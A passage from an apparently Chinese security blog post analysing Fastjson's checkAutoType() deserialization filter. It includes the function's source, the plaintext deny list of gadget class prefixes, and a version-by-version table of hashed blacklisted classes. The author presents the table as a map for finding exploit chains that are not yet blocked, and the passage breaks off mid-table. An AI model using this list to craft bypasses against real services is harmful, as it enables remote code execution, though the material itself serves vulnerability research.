<span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br> <br>    <span class="hljs-comment">// autoTypeSupport默认为False</span><br>    <span class="hljs-comment">// 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤</span><br>    <span class="hljs-keyword">if</span> (autoTypeSupport || expectClass != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; acceptList.length; ++i) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">accept</span> <span class="hljs-operator">=</span> acceptList[i];<br>            <span class="hljs-keyword">if</span> (className.startsWith(accept)) &#123;<br>                <span class="hljs-keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; denyList.length; ++i) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">deny</span> <span class="hljs-operator">=</span> denyList[i];<br>            <span class="hljs-keyword">if</span> (className.startsWith(deny)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-comment">// 从Map缓存中获取类，注意这是后面版本的漏洞点</span><br>    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);<br>    <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>        clazz = deserializers.findClass(typeName);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>        &#125;<br> <br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br> <br>    <span class="hljs-comment">// 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错</span><br>    <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; denyList.length; ++i) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">deny</span> <span class="hljs-operator">=</span> denyList[i];<br>            <span class="hljs-comment">// 从denyList中获取元素后 匹配头部</span><br>            <span class="hljs-keyword">if</span> (className.startsWith(deny)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; acceptList.length; ++i) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">accept</span> <span class="hljs-operator">=</span> acceptList[i];<br>            <span class="hljs-keyword">if</span> (className.startsWith(accept)) &#123;<br>                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);<br> <br>                <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                &#125;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> (autoTypeSupport || expectClass != <span class="hljs-literal">null</span>) &#123;<br>        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br> <br>        <span class="hljs-keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="hljs-comment">// classloader is danger</span><br>            || DataSource.class.isAssignableFrom(clazz) <span class="hljs-comment">// dataSource can load jdbc driver</span><br>           ) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br> <br>        <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br> <br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>denyList</code>黑名单列表如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">bsh<br>com<span class="hljs-selector-class">.mchange</span><br>com<span class="hljs-selector-class">.sun</span>.<br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Thread</span><br>java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.Socket</span><br>java<span class="hljs-selector-class">.rmi</span><br>javax<span class="hljs-selector-class">.xml</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.bcel</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.beanutils</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.Transformer</span> org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span> org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.comparators</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.fileupload</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.myfaces</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.servlet</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.wicket</span><span class="hljs-selector-class">.util</span><br>org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span><span class="hljs-selector-class">.runtime</span><br>org<span class="hljs-selector-class">.hibernate</span><br>org<span class="hljs-selector-class">.jboss</span><br>org<span class="hljs-selector-class">.mozilla</span><span class="hljs-selector-class">.javascript</span><br>org<span class="hljs-selector-class">.python</span><span class="hljs-selector-class">.core</span><br>org.springframework<br></code></pre></td></tr></table></figure><p>以这些开头的类，大部分的利用链都不能使用了。</p><h2 id="autoTypeSupport参数："><a href="#autoTypeSupport参数：" class="headerlink" title="autoTypeSupport参数："></a>autoTypeSupport参数：</h2><p>autoTypeSupport是<code>checkAutoType()</code>函数出现后ParserConfig.java中新增的一个配置选项，在<code>checkAutoType()</code>函数的某些代码逻辑起到开关的作用。简单来说是就是启动autotype，这样就可以进行白名单校验，然后尝试bypass了。</p><p>默认情况下<code>autoTypeSupport</code>为False，将其设置为True有两种方法：</p><ul><li><p>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></p></li><li><p>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>，如果有使用非全局ParserConfig则用另外调用<code>setAutoTypeSupport(true);</code></p></li></ul><p>AutoType白名单设置方法：</p><ol><li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li><li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code></li></ol><p><img src="/../../../blog_image/image-20240414104704129-1716861113343-72.png" alt="image-20240414104704129"></p><ol start="3"><li>通过fastjson.properties文件配置。在1.2.25&#x2F;1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li></ol><p>小结：</p><p>在1.2.24版本后，使用<code>checkAutoType</code>函数，通过白名单以及黑名单过滤的方式去防御fastjson反序列化，因此我们可以尝试对白名单和黑名单进行bypass，而网上一些文章讲的都是针对1.2.41、1.2.42、1.2.43、1.2.45这些特定版本的补丁绕过，其实实际上并不只是针对该特定版本，而是针对从1.2.25开始的一系列版本，自己试下就知道PoC可以打哪些范围了。（师傅原话）</p><h1 id="2-寻找利用链："><a href="#2-寻找利用链：" class="headerlink" title="2. 寻找利用链："></a>2. 寻找利用链：</h1><h2 id="fastjson黑白名单："><a href="#fastjson黑白名单：" class="headerlink" title="fastjson黑白名单："></a>fastjson黑白名单：</h2><p>我们可以从修复的角度来看，对于存在的黑名单，我们就不能利用了，我们可以寻找还没有被黑名单过滤的利用链。</p><p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p><p>目前已知的黑名单列表如下：</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>-8720046426850100497</td><td>0x86fc2bf9beaf7aefL</td><td>org.apache.commons.collections4.comparators</td></tr><tr><td>1.2.42</td><td>-8109300701639721088</td><td>0x8f75f9fa0df03f80L</td><td>org.python.core</td></tr><tr><td>1.2.42</td><td>-7966123100503199569</td><td>0x9172a53f157930afL</td><td>org.apache.tomcat</td></tr><tr><td>1.2.42</td><td>-7766605818834748097</td><td>0x9437792831df7d3fL</td><td>org.apache.xalan</td></tr><tr><td>1.2.42</td><td>-6835437086156813536</td><td>0xa123a62f93178b20L</td><td>javax.xml</td></tr><tr><td>1.2.42</td><td>-4837536971810737970</td><td>0xbcdd9dc12766f0ceL</td><td>org.springframework.</td></tr><tr><td>1.2.42</td><td>-4082057040235125754</td><td>0xc7599ebfe3e72406L</td><td>org.apache.commons.beanutils</td></tr><tr><td>1.2.42</td><td>-2364987994247679115</td><td>0xdf2ddff310cdb375L</td><td>org.apache.commons.collections.Transformer</td></tr><tr><td>1.2.42</td><td>-1872417015366588117</td><td>0xe603d6a51fad692bL</td><td>org.codehaus.groovy.runtime</td></tr><tr><td>1.2.42</td><td>-254670111376247151</td><td>0xfc773ae20c827691L</td><td>java.lang.Thread</td></tr><tr><td>1.2.42</td><td>-190281065685395680</td><td>0xfd5bfc610056d720L</td><td>javax.net.</td></tr><tr><td>1.2.42</td><td>313864100207897507</td><td>0x45b11bc78a3aba3L</td><td>com.mchange</td></tr><tr><td>1.2.42</td><td>1203232727967308606</td><td>0x10b2bdca849d9b3eL</td><td>org.apache.wicket.util</td></tr><tr><td>1.2.42</td><td>1502845958873959152</td><td>0x14db2e6fead04af0L</td><td>java.util.jar.</td></tr><tr><td>1.2.42</td><td>3547627781654598988</td><td>0x313bb4abd8d4554cL</td><td>org.mozilla.javascript</td></tr><tr><td>1.2.42</td><td>3730752432285826863</td><td>0x33c64b921f523f2fL</td><td>java.rmi</td></tr><tr><td>1.2.42</td><td>3794316665763266033</td><td>0x34a81ee78429fdf1L</td><td>java.util.prefs.</td></tr><tr><td>1.2.42</td><td>4147696707147271408</td><td>0x398f942e01920cf0L</td><td>com.sun.</td></tr><tr><td>1.2.42</td><td>5347909877633654828</td><td>0x4a3797b30328202cL</td><td>java.util.logging.</td></tr><tr><td>1.2.42</td><td>5450448828334921485</td><td>0x4ba3e254e758d70dL</td><td>org.apache.bcel</td></tr><tr><td>1.2.42</td><td>5751393439502795295</td><td>0x4fd10ddc6d13821fL</td><td>java.net.Socket</td></tr><tr><td>1.2.42</td><td>5944107969236155580</td><td>0x527db6b46ce3bcbcL</td><td>org.apache.commons.fileupload</td></tr><tr><td>1.2.42</td><td>6742705432718011780</td><td>0x5d92e6ddde40ed84L</td><td>org.jboss</td></tr><tr><td>1.2.42</td><td>7179336928365889465</td><td>0x63a220e60a17c7b9L</td><td>org.hibernate</td></tr><tr><td>1.2.42</td><td>7442624256860549330</td><td>0x6749835432e0f0d2L</td><td>org.apache.commons.collections.functors</td></tr><tr><td>1.2.42</td><td>8838294710098435315</td><td>0x7aa7ee3627a19cf3L</td><td>org.apache.myfaces.context.servlet</td></tr><tr><td>1.2.43</td><td>-2262244760619952081</td><td>0xe09ae4604842582fL</td><td>java.net.URL</td></tr><tr><td>1.2.46</td><td>-8165637398350707645</td><td>0x8eadd40cb2a94443L</td><td>junit.</td></tr><tr><td>1.2.46</td><td>-8083514888460375884</td><td>0x8fd1960988bce8b4L</td><td>org.apache.ibatis.datasource</td></tr><tr><td>1.2.46</td><td>-7921218830998286408</td><td>0x92122d710e364fb8L</td><td>org.osjava.sj.</td></tr><tr><td>1.2.46</td><td>-7768608037458185275</td><td>0x94305c26580f73c5L</td><td>org.apache.log4j.</td></tr><tr><td>1.2.46</td><td>-6179589609550493385</td><td>0xaa3daffdb10c4937L</td><td>org.logicalcobwebs.</td></tr><tr><td>1.2.46</td><td>-5194641081268104286</td><td>0xb7e8ed757f5d13a2L</td><td>org.apache.logging.</td></tr><tr><td>1.2.46</td><td>-3935185854875733362</td><td>0xc963695082fd728eL</td><td>org.apache.commons.dbcp</td></tr><tr><td>1.2.46</td><td>-2753427844400776271</td><td>0xd9c9dbf6bbd27bb1L</td><td>com.ibatis.sqlmap.engine.datasource</td></tr><tr><td>1.2.46</td><td>-1589194880214235129</td><td>0xe9f20bad25f60807L</td><td>org.jdom.</td></tr><tr><td>1.2.46</td><td>1073634739308289776</td><td>0xee6511b66fd5ef0L</td><td>org.slf4j.</td></tr><tr><td>1.2.46</td><td>5688200883751798389</td><td>0x4ef08c90ff16c675L</td><td>javassist.</td></tr><tr><td>1.2.46</td><td>7017492163108594270</td><td>0x616323f12c2ce25eL</td><td>oracle.net</td></tr><tr><td>1.2.46</td><td>8389032537095247355</td><td>0x746bd4a53ec195fbL</td><td>org.jaxen.</td></tr><tr><td>1.2.48</td><td>1459860845934817624</td><td>0x144277b467723158L</td><td>java.net.InetAddress</td></tr><tr><td>1.2.48</td><td>8409640769019589119</td><td>0x74b50bb9260e31ffL</td><td>java.lang.Class</td></tr><tr><td>1.2.49</td><td>4904007817188630457</td><td>0x440e89208f445fb9L</td><td>com.alibaba.fastjson.annotation</td></tr><tr><td>1.2.59</td><td>5100336081510080343</td><td>0x46c808a4b5841f57L</td><td>org.apache.cxf.jaxrs.provider.</td></tr><tr><td>1.2.59</td><td>6456855723474196908</td><td>0x599b5c1213a099acL</td><td>ch.qos.logback.</td></tr><tr><td>1.2.59</td><td>8537233257283452655</td><td>0x767a586a5107feefL</td><td>net.sf.ehcache.transaction.manager.</td></tr><tr><td>1.2.60</td><td>3688179072722109200</td><td>0x332f0b5369a18310L</td><td>com.zaxxer.hikari.</td></tr><tr><td>1.2.61</td><td>-4401390804044377335</td><td>0xc2eb1e621f439309L</td><td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td></tr><tr><td>1.2.61</td><td>-1650485814983027158</td><td>0xe9184be55b1d962aL</td><td>org.apache.openjpa.ee.</td></tr><tr><td>1.2.61</td><td>-1251419154176620831</td><td>0xeea210e8da2ec6e1L</td><td>oracle.jdbc.rowset.OracleJDBCRowSet</td></tr><tr><td>1.2.61</td><td>-9822483067882491</td><td>0xffdd1a80f1ed3405L</td><td>com.mysql.cj.jdbc.admin.</td></tr><tr><td>1.2.61</td><td>99147092142056280</td><td>0x1603dc147a3e358L</td><td>oracle.jdbc.connector.OracleManagedConnectionFactory</td></tr><tr><td>1.2.61</td><td>3114862868117605599</td><td>0x2b3a37467a344cdfL</td><td>org.apache.ibatis.parsing.</td></tr><tr><td>1.2.61</td><td>4814658433570175913</td><td>0x42d11a560fc9fba9L</td><td>org.apache.axis2.jaxws.spi.handler.</td></tr><tr><td>1.2.61</td><td>6511035576063254270</td><td>0x5a5bd85c072e5efeL</td><td>jodd.db.connection.</td></tr><tr><td>1.2.61</td><td>8925522461579647174</td><td>0x7bddd363ad3998c6L</td><td>org.apache.commons.configuration.JNDIConfiguration</td></tr><tr><td>1.2.62</td><td>-9164606388214699518</td><td>0x80d0c70bcc2fea02L</td><td>org.apache.ibatis.executor.</td></tr><tr><td>1.2.62</td><td>-8649961213709896794</td><td>0x87f52a1b07ea33a6L</td><td>net.sf.cglib.</td></tr><tr><td>1.2.62</td><td>-6316154655839304624</td><td>0xa85882ce1044c450L</td><td>oracle.net.</td></tr><tr><td>1.2.62</td><td>-5764804792063216819</td><td>0xafff4c95b99a334dL</td><td>com.mysql.cj.jdbc.MysqlDataSource</td></tr><tr><td>1.2.62</td><td>-4608341446948126581</td><td>0xc00be1debaf2808bL</td><td>jdk.internal.</td></tr><tr><td>1.2.62</td><td>-4438775680185074100</td><td>0xc2664d0958ecfe4cL</td><td>aj.org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>-3319207949486691020</td><td>0xd1efcdf4b3316d34L</td><td>oracle.jdbc.</td></tr><tr><td>1.2.62</td><td>-2192804397019347313</td><td>0xe1919804d5bf468fL</td><td>org.apache.commons.collections.comparators.</td></tr><tr><td>1.2.62</td><td>-2095516571388852610</td><td>0xe2eb3ac7e56c467eL</td><td>net.sf.ehcache.hibernate.</td></tr><tr><td>1.2.62</td><td>4750336058574309</td><td>0x10e067cd55c5e5L</td><td>com.mysql.cj.log.</td></tr><tr><td>1.2.62</td><td>218512992947536312</td><td>0x3085068cb7201b8L</td><td>org.h2.jdbcx.</td></tr><tr><td>1.2.62</td><td>823641066473609950</td><td>0xb6e292fa5955adeL</td><td>org.apache.commons.logging.</td></tr><tr><td>1.2.62</td><td>1534439610567445754</td><td>0x154b6cb22d294cfaL</td><td>org.apache.ibatis.reflection.</td></tr><tr><td>1.2.62</td><td>1818089308493370394</td><td>0x193b2697eaaed41aL</td><td>org.h2.server.</td></tr><tr><td>1.2.62</td><td>2164696723069287854</td><td>0x1e0a8c3358ff3daeL</td><td>org.apache.ibatis.datasource.</td></tr><tr><td>1.2.62</td><td>2653453629929770569</td><td>0x24d2f6048fef4e49L</td><td>org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>2836431254737891113</td><td>0x275d0732b877af29L</td><td>flex.messaging.util.concurrent.</td></tr><tr><td>1.2.62</td><td>3089451460101527857</td><td>0x2adfefbbfe29d931L</td><td>org.apache.ibatis.javassist.</td></tr><tr><td>1.2.62</td><td>3256258368248066264</td><td>0x2d308dbbc851b0d8L</td><td>java.lang.UNIXProcess</td></tr><tr><td>1.2.62</td><td>3718352661124136681</td><td>0x339a3e0b6beebee9L</td><td>org.apache.ibatis.ognl.</td></tr><tr><td>1.2.62</td><td>4046190361520671643</td><td>0x3826f4b2380c8b9bL</td><td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td></tr><tr><td>1.2.62</td><td>4841947709850912914</td><td>0x43320dc9d2ae0892L</td><td>org.codehaus.jackson.</td></tr><tr><td>1.2.62</td><td>6280357960959217660</td><td>0x5728504a6d454ffcL</td><td>org.apache.ibatis.scripting.</td></tr><tr><td>1.2.62</td><td>6534946468240507089</td><td>0x5ab0cb3071ab40d1L</td><td>org.apache.commons.proxy.</td></tr><tr><td>1.2.62</td><td>6734240326434096246</td><td>0x5d74d3e5b9370476L</td><td>com.mysql.cj.jdbc.MysqlXADataSource</td></tr><tr><td>1.2.62</td><td>7123326897294507060</td><td>0x62db241274397c34L</td><td>org.apache.commons.collections.functors.</td></tr><tr><td>1.2.62</td><td>8488266005336625107</td><td>0x75cc60f5871d0fd3L</td><td>org.apache.commons.configuration</td></tr><tr><td>1.2.66</td><td>-2439930098895578154</td><td>0xde23a0809a8b9bd6L</td><td>javax.script.</td></tr><tr><td>1.2.66</td><td>-582813228520337988</td><td>0xf7e96e74dfa58dbcL</td><td>javax.sound.</td></tr><tr><td>1.2.66</td><td>-26639035867733124</td><td>0xffa15bf021f1e37cL</td><td>javax.print.</td></tr><tr><td>1.2.66</td><td>386461436234701831</td><td>0x55cfca0f2281c07L</td><td>javax.activation.</td></tr><tr><td>1.2.66</td><td>1153291637701043748</td><td>0x100150a253996624L</td><td>javax.tools.</td></tr><tr><td>1.2.66</td><td>1698504441317515818L</td><td>0x17924cca5227622aL</td><td>javax.management.</td></tr><tr><td>1.2.66</td><td>7375862386996623731L</td><td>0x665c53c311193973L</td><td>org.apache.xbean.</td></tr><tr><td>1.2.66</td><td>7658177784286215602L</td><td>0x6a47501ebb2afdb2L</td><td>org.eclipse.jetty.</td></tr><tr><td>1.2.66</td><td>8055461369741094911L</td><td>0x6fcabf6fa54cafffL</td><td>javax.naming.</td></tr><tr><td>1.2.67</td><td>-7775351613326101303L</td><td>0x941866e73beff4c9L</td><td>org.apache.shiro.realm.</td></tr><tr><td>1.2.67</td><td>-6025144546313590215L</td><td>0xac6262f52c98aa39L</td><td>org.apache.http.conn.</td></tr><tr><td>1.2.67</td><td>-5939269048541779808L</td><td>0xad937a449831e8a0L</td><td>org.quartz.</td></tr><tr><td>1.2.67</td><td>-5885964883385605994L</td><td>0xae50da1fad60a096L</td><td>com.taobao.eagleeye.wrapper</td></tr><tr><td>1.2.67</td><td>-3975378478825053783L</td><td>0xc8d49e5601e661a9L</td><td>org.apache.http.impl.</td></tr><tr><td>1.2.67</td><td>-2378990704010641148L</td><td>0xdefc208f237d4104L</td><td>com.ibatis.</td></tr><tr><td>1.2.67</td><td>-905177026366752536L</td><td>0xf3702a4a5490b8e8L</td><td>org.apache.catalina.</td></tr><tr><td>1.2.67</td><td>2660670623866180977L</td><td>0x24ec99d5e7dc5571L</td><td>org.apache.http.auth.</td></tr><tr><td>1.2.67</td><td>2731823439467737506L</td><td>0x25e962f1c28f71a2L</td><td>br.com.anteros.</td></tr><tr><td>1.2.67</td><td>3637939656440441093L</td><td>0x327c8ed7c8706905L</td><td>com.caucho.</td></tr><tr><td>1.2.67</td><td>4254584350247334433L</td><td>0x3b0b51ecbf6db221L</td><td>org.apache.http.cookie.</td></tr><tr><td>1.2.67</td><td>5274044858141538265L</td><td>0x49312bdafb0077d9L</td><td>org.javasimon.</td></tr><tr><td>1.2.67</td><td>5474268165959054640L</td><td>0x4bf881e49d37f530L</td><td>org.apache.cocoon.</td></tr><tr><td>1.2.67</td><td>5596129856135573697L</td><td>0x4da972745feb30c1L</td><td>org.apache.activemq.jms.pool.</td></tr><tr><td>1.2.67</td><td>6854854816081053523L</td><td>0x5f215622fb630753L</td><td>org.mortbay.jetty.</td></tr><tr><td>1.2.68</td><td>-3077205613010077203L</td><td>0xd54b91cc77b239edL</td><td>org.apache.shiro.jndi.</td></tr><tr><td>1.2.68</td><td>-2825378362173150292L</td><td>0xd8ca3d595e982bacL</td><td>org.apache.ignite.cache.jta.</td></tr><tr><td>1.2.68</td><td>2078113382421334967L</td><td>0x1cd6f11c6a358bb7L</td><td>javax.swing.J</td></tr><tr><td>1.2.68</td><td>6007332606592876737L</td><td>0x535e552d6f9700c1L</td><td>org.aoju.bus.proxy.provider.</td></tr><tr><td>1.2.68</td><td>9140390920032557669L</td><td>0x7ed9311d28bf1a65L</td><td>java.awt.p</td></tr><tr><td>1.2.68</td><td>9140416208800006522L</td><td>0x7ed9481d28bf417aL</td><td>java.awt.i</td></tr><tr><td>1.2.69</td><td>-8024746738719829346L</td><td>0x90a25f5baa21529eL</td><td>java.io.Serializable</td></tr><tr><td>1.2.69</td><td>-5811778396720452501L</td><td>0xaf586a571e302c6bL</td><td>java.io.Closeable</td></tr><tr><td>1.2.69</td><td>-3053747177772160511L</td><td>0xd59ee91f0b09ea01L</td><td>oracle.jms.AQ</td></tr><tr><td>1.2.69</td><td>-2114196234051346931L</td><td>0xe2a8ddba03e69e0dL</td><td>java.util.Collection</td></tr><tr><td>1.2.69</td><td>-2027296626235911549L</td><td>0xe3dd9875a2dc5283L</td><td>java.lang.Iterable</td></tr><tr><td>1.2.69</td><td>-2939497380989775398L</td><td>0xd734ceb4c3e9d1daL</td><td>java.lang.Object</td></tr><tr><td>1.2.69</td><td>-1368967840069965882L</td><td>0xed007300a7b227c6L</td><td>java.lang.AutoCloseable</td></tr><tr><td>1.2.69</td><td>2980334044947851925L</td><td>0x295c4605fd1eaa95L</td><td>java.lang.Readable</td></tr><tr><td>1.2.69</td><td>3247277300971823414L</td><td>0x2d10a5801b9d6136L</td><td>java.lang.Cloneable</td></tr><tr><td>1.2.69</td><td>5183404141909004468L</td><td>0x47ef269aadc650b4L</td><td>java.lang.Runnable</td></tr><tr><td>1.2.69</td><td>7222019943667248779L</td><td>0x6439c4dff712ae8bL</td><td>java.util.EventListener</td></tr><tr><td>1.2.70</td><td>-5076846148177416215L</td><td>0xb98b6b5396932fe9L</td><td>org.apache.commons.collections4.Transformer</td></tr><tr><td>1.2.70</td><td>-4703320437989596122L</td><td>0xbeba72fb1ccba426L</td><td>org.apache.commons.collections4.functors</td></tr><tr><td>1.2.70</td><td>-4314457471973557243L</td><td>0xc41ff7c9c87c7c05L</td><td>org.jdom2.transform.</td></tr><tr><td>1.2.70</td><td>-2533039401923731906L</td><td>0xdcd8d615a6449e3eL</td><td>org.apache.hadoop.shaded.com.zaxxer.hikari.</td></tr><tr><td>1.2.70</td><td>156405680656087946L</td><td>0x22baa234c5bfb8aL</td><td>com.p6spy.engine.</td></tr><tr><td>1.2.70</td><td>1214780596910349029L</td><td>0x10dbc48446e0dae5L</td><td>org.apache.activemq.pool.</td></tr><tr><td>1.2.70</td><td>3085473968517218653L</td><td>0x2ad1ce3a112f015dL</td><td>org.apache.aries.transaction.</td></tr><tr><td>1.2.70</td><td>3129395579983849527L</td><td>0x2b6dd8b3229d6837L</td><td>org.apache.activemq.ActiveMQConnectionFactory</td></tr><tr><td>1.2.70</td><td>4241163808635564644L</td><td>0x3adba40367f73264L</td><td>org.apache.activemq.spring.</td></tr><tr><td>1.2.70</td><td>7240293012336844478L</td><td>0x647ab0224e149ebeL</td><td>org.apache.activemq.ActiveMQXAConnectionFactory</td></tr><tr><td>1.2.70</td><td>7347653049056829645L</td><td>0x65f81b84c1d920cdL</td><td>org.apache.commons.jelly.</td></tr><tr><td>1.2.70</td><td>7617522210483516279L</td><td>0x69b6e0175084b377L</td><td>org.apache.axis2.transport.jms.</td></tr><tr><td>1.2.71</td><td>-4537258998789938600L</td><td>0xc1086afae32e6258L</td><td>java.io.FileReader</td></tr><tr><td>1.2.71</td><td>-4150995715611818742L</td><td>0xc664b363baca050aL</td><td>java.io.ObjectInputStream</td></tr><tr><td>1.2.71</td><td>-2995060141064716555L</td><td>0xd66f68ab92e7fef5L</td><td>java.io.FileInputStream</td></tr><tr><td>1.2.71</td><td>-965955008570215305L</td><td>0xf2983d099d29b477L</td><td>java.io.ObjectOutputStream</td></tr><tr><td>1.2.71</td><td>-219577392946377768L</td><td>0xfcf3e78644b98bd8L</td><td>java.io.DataOutputStream</td></tr><tr><td>1.2.71</td><td>2622551729063269307L</td><td>x24652ce717e713bbL</td><td>java.io.PrintWriter</td></tr><tr><td>1.2.71</td><td>2930861374593775110L</td><td>0x28ac82e44e933606L</td><td>java.io.Buffered</td></tr><tr><td>1.2.71</td><td>4000049462512838776L</td><td>0x378307cb0111e878L</td><td>java.io.InputStreamReader</td></tr><tr><td>1.2.71</td><td>4193204392725694463L</td><td>0x3a31412dbb05c7ffL</td><td>java.io.OutputStreamWriter</td></tr><tr><td>1.2.71</td><td>5545425291794704408L</td><td>0x4cf54eec05e3e818L</td><td>java.io.FileWriter</td></tr><tr><td>1.2.71</td><td>6584624952928234050L</td><td>0x5b6149820275ea42L</td><td>java.io.FileOutputStream</td></tr><tr><td>1.2.71</td><td>7045245923763966215L</td><td>0x61c5bdd721385107L</td><td>java.io.DataInputStream</td></tr><tr><td>1.2.83</td><td>-875400697546